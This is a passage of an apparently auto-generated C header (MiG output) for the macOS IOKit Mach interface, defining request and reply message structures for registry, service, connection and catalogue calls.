		mach_msg_type_number_t notification_typeCnt;
		char notification_type[128];
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
	} __Request__io_service_add_notification_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} __Request__io_registry_entry_get_path_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t path_ool;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[4096];
		mach_msg_type_number_t path_oolCnt;
	} __Request__io_registry_entry_from_path_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} __Request__io_device_tree_entry_exists_with_name_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_vm_address_t buf;
		mach_vm_size_t bufsize;
	} __Request__io_registry_entry_get_properties_bin_buf_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		uint32_t options;
		mach_vm_address_t buf;
		mach_vm_size_t bufsize;
	} __Request__io_registry_entry_get_property_bin_buf_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Request__iokit_subsystem__defined */

/* union of all requests */

#ifndef __RequestUnion__iokit_subsystem__defined
#define __RequestUnion__iokit_subsystem__defined
union __RequestUnion__iokit_subsystem {
	__Request__io_object_get_class_t Request_io_object_get_class;
	__Request__io_object_conforms_to_t Request_io_object_conforms_to;
	__Request__io_iterator_next_t Request_io_iterator_next;
	__Request__io_iterator_reset_t Request_io_iterator_reset;
	__Request__io_service_get_matching_services_t Request_io_service_get_matching_services;
	__Request__io_registry_entry_get_property_t Request_io_registry_entry_get_property;
	__Request__io_registry_create_iterator_t Request_io_registry_create_iterator;
	__Request__io_registry_iterator_enter_entry_t Request_io_registry_iterator_enter_entry;
	__Request__io_registry_iterator_exit_entry_t Request_io_registry_iterator_exit_entry;
	__Request__io_registry_entry_from_path_t Request_io_registry_entry_from_path;
	__Request__io_registry_entry_get_name_t Request_io_registry_entry_get_name;
	__Request__io_registry_entry_get_properties_t Request_io_registry_entry_get_properties;
	__Request__io_registry_entry_get_property_bytes_t Request_io_registry_entry_get_property_bytes;
	__Request__io_registry_entry_get_child_iterator_t Request_io_registry_entry_get_child_iterator;
	__Request__io_registry_entry_get_parent_iterator_t Request_io_registry_entry_get_parent_iterator;
	__Request__io_service_close_t Request_io_service_close;
	__Request__io_connect_get_service_t Request_io_connect_get_service;
	__Request__io_connect_add_client_t Request_io_connect_add_client;
	__Request__io_connect_set_properties_t Request_io_connect_set_properties;
	__Request__io_registry_entry_get_path_t Request_io_registry_entry_get_path;
	__Request__io_registry_get_root_entry_t Request_io_registry_get_root_entry;
	__Request__io_registry_entry_set_properties_t Request_io_registry_entry_set_properties;
	__Request__io_registry_entry_in_plane_t Request_io_registry_entry_in_plane;
	__Request__io_object_get_retain_count_t Request_io_object_get_retain_count;
	__Request__io_service_get_busy_state_t Request_io_service_get_busy_state;
	__Request__io_service_wait_quiet_t Request_io_service_wait_quiet;
	__Request__io_registry_entry_create_iterator_t Request_io_registry_entry_create_iterator;
	__Request__io_iterator_is_valid_t Request_io_iterator_is_valid;
	__Request__io_catalog_send_data_t Request_io_catalog_send_data;
	__Request__io_catalog_terminate_t Request_io_catalog_terminate;
	__Request__io_catalog_get_data_t Request_io_catalog_get_data;
	__Request__io_catalog_get_gen_count_t Request_io_catalog_get_gen_count;
	__Request__io_catalog_module_loaded_t Request_io_catalog_module_loaded;
	__Request__io_catalog_reset_t Request_io_catalog_reset;
	__Request__io_service_request_probe_t Request_io_service_request_probe;
	__Request__io_registry_entry_get_name_in_plane_t Request_io_registry_entry_get_name_in_plane;
	__Request__io_service_match_property_table_t Request_io_service_match_property_table;
	__Request__io_connect_get_notification_semaphore_t Request_io_connect_get_notification_semaphore;
	__Request__io_registry_entry_get_location_in_plane_t Request_io_registry_entry_get_location_in_plane;
	__Request__io_registry_entry_get_property_recursively_t Request_io_registry_entry_get_property_recursively;
	__Request__io_service_get_state_t Request_io_service_get_state;
	__Request__io_service_get_matching_services_ool_t Request_io_service_get_matching_services_ool;
	__Request__io_service_match_property_table_ool_t Request_io_service_match_property_table_ool;
	__Request__io_object_get_superclass_t Request_io_object_get_superclass;
	__Request__io_object_get_bundle_identifier_t Request_io_object_get_bundle_identifier;
	__Request__io_service_open_extended_t Request_io_service_open_extended;
	__Request__io_connect_map_memory_into_task_t Request_io_connect_map_memory_into_task;
	__Request__io_connect_unmap_memory_from_task_t Request_io_connect_unmap_memory_from_task;
	__Request__io_connect_method_t Request_io_connect_method;
	__Request__io_connect_async_method_t Request_io_connect_async_method;
	__Request__io_connect_set_notification_port_t Request_io_connect_set_notification_port;
	__Request__io_service_add_notification_t Request_io_service_add_notification;
	__Request__io_service_add_interest_notification_t Request_io_service_add_interest_notification;
	__Request__io_service_add_notification_ool_t Request_io_service_add_notification_ool;
	__Request__io_registry_entry_get_registry_entry_id_t Request_io_registry_entry_get_registry_entry_id;
	__Request__io_connect_method_var_output_t Request_io_connect_method_var_output;
	__Request__io_service_get_matching_service_t Request_io_service_get_matching_service;
	__Request__io_service_get_matching_service_ool_t Request_io_service_get_matching_service_ool;
	__Request__io_service_get_authorization_id_t Request_io_service_get_authorization_id;
	__Request__io_service_set_authorization_id_t Request_io_service_set_authorization_id;
	__Request__io_server_version_t Request_io_server_version;
	__Request__io_registry_entry_get_properties_bin_t Request_io_registry_entry_get_properties_bin;
	__Request__io_registry_entry_get_property_bin_t Request_io_registry_entry_get_property_bin;
	__Request__io_service_get_matching_service_bin_t Request_io_service_get_matching_service_bin;
	__Request__io_service_get_matching_services_bin_t Request_io_service_get_matching_services_bin;
	__Request__io_service_match_property_table_bin_t Request_io_service_match_property_table_bin;
	__Request__io_service_add_notification_bin_t Request_io_service_add_notification_bin;
	__Request__io_registry_entry_get_path_ool_t Request_io_registry_entry_get_path_ool;
	__Request__io_registry_entry_from_path_ool_t Request_io_registry_entry_from_path_ool;
	__Request__io_device_tree_entry_exists_with_name_t Request_io_device_tree_entry_exists_with_name;
	__Request__io_registry_entry_get_properties_bin_buf_t Request_io_registry_entry_get_properties_bin_buf;
	__Request__io_registry_entry_get_property_bin_buf_t Request_io_registry_entry_get_property_bin_buf;
};
#endif /* !__RequestUnion__iokit_subsystem__defined */
/* typedefs for all replies */

#ifndef __Reply__iokit_subsystem__defined
#define __Reply__iokit_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t classNameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t classNameCnt;
		char className[128];
	} __Reply__io_object_get_class_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t conforms;
	} __Reply__io_object_conforms_to_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t object;
		/* end of the kernel processed data */
	} __Reply__io_iterator_next_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_iterator_reset_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
	} __Reply__io_service_get_matching_services_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply__io_registry_entry_get_property_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply__io_registry_create_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_registry_iterator_enter_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_registry_iterator_exit_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t registry_entry;
		/* end of the kernel processed data */
	} __Reply__io_registry_entry_from_path_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} __Reply__io_registry_entry_get_name_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply__io_registry_entry_get_properties_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t dataCnt;
		char data[4096];
	} __Reply__io_registry_entry_get_property_bytes_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply__io_registry_entry_get_child_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply__io_registry_entry_get_parent_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_service_close_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
	} __Reply__io_connect_get_service_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_connect_add_client_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
	} __Reply__io_connect_set_properties_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[512];
	} __Reply__io_registry_entry_get_path_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t root;
		/* end of the kernel processed data */
	} __Reply__io_registry_get_root_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
	} __Reply__io_registry_entry_set_properties_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t inPlane;
	} __Reply__io_registry_entry_in_plane_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t retainCount;
	} __Reply__io_object_get_retain_count_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t busyState;
	} __Reply__io_service_get_busy_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_service_wait_quiet_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply__io_registry_entry_create_iterator_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t is_valid;
	} __Reply__io_iterator_is_valid_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
	} __Reply__io_catalog_send_data_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_catalog_terminate_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t outData;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t outDataCnt;
	} __Reply__io_catalog_get_data_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t genCount;
	} __Reply__io_catalog_get_gen_count_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_catalog_module_loaded_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_catalog_reset_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_service_request_probe_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t nameCnt;
		char name[128];
	} __Reply__io_registry_entry_get_name_in_plane_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t matches;
	} __Reply__io_service_match_property_table_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
	} __Reply__io_connect_get_notification_semaphore_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t locationOffset; /* MiG doesn't use it */
		mach_msg_type_number_t locationCnt;
		char location[128];
	} __Reply__io_registry_entry_get_location_in_plane_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply__io_registry_entry_get_property_recursively_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t state;
		uint32_t busy_state;
		uint64_t accumulated_busy_time;
	} __Reply__io_service_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply__io_service_get_matching_services_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
		boolean_t matches;
	} __Reply__io_service_match_property_table_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t class_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t class_nameCnt;
		char class_name[128];
	} __Reply__io_object_get_superclass_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t class_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t class_nameCnt;
		char class_name[128];
	} __Reply__io_object_get_bundle_identifier_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t connection;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply__io_service_open_extended_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t address;
		mach_vm_size_t size;
	} __Reply__io_connect_map_memory_into_task_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_connect_unmap_memory_from_task_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_vm_size_t ool_output_size;
	} __Reply__io_connect_method_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_vm_size_t ool_output_size;
	} __Reply__io_connect_async_method_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_connect_set_notification_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
	} __Reply__io_service_add_notification_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
	} __Reply__io_service_add_interest_notification_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notification;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply__io_service_add_notification_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t entry_id;
	} __Reply__io_registry_entry_get_registry_entry_id_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t var_output;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_msg_type_number_t var_outputCnt;
	} __Reply__io_connect_method_var_output_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
	} __Reply__io_service_get_matching_service_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply__io_service_get_matching_service_ool_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t authorization_id;
	} __Reply__io_service_get_authorization_id_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__io_service_set_authorization_id_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint64_t version;
	} __Reply__io_server_version_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply__io_registry_entry_get_properties_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply__io_registry_entry_get_property_bin_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
